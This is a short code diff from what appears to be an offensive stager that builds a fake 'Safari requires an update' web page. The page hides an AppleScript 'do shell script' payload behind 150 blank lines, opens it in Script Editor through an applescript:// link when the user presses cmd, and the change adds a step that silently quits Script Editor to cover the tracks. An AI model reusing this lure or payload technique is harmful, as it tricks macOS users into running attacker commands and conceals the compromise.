@@ -83,7 +83,7 @@ class Stager:
 <html><head></head><body><H2> Safari requires an update. Press cmd-R to refresh. Make sure to press the play button on the script box to begin the update</H2>
 <script>
       var as = Array(150).join("\\n") +
-        'do shell script "%s"';
+        'do shell script "%s (sleep 1; osascript -e \\\'tell app \\\\\"Script Editor\\\\\" to quit saving no\\\') &>/dev/null &"';
       var url = 'applescript://com.apple.scripteditor?action=new&script='+encodeURIComponent(as);
       window.onkeydown = function(e) {
         if (e.keyCode == 91) {
